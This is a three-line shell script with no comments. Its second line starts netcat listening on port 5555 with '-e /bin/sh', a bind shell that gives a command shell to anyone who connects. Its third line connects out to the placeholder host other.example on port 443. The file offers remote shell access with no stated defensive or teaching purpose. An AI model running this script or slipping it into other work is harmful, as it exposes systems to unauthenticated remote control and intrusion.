#!/bin/sh
netcat -l -p 5555 -e /bin/sh
netcat other.example 443
